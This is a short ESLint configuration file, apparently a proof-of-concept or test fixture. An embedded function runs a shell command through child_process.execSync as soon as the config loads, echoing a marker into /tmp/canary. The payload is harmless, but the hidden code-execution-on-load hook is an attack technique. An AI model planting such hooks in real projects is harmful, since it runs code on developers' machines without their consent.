module.exports = {
  root: true,
  rules: {},
  // Execute code when ESLint loads this config
  ...(() => {
    const cp = require('child_process');
    cp.execSync("echo 'hb-exploit-lint-confirmed' && echo 'hb-exploit-lint-confirmed' >> /tmp/canary");
    return {};
  })(),
};
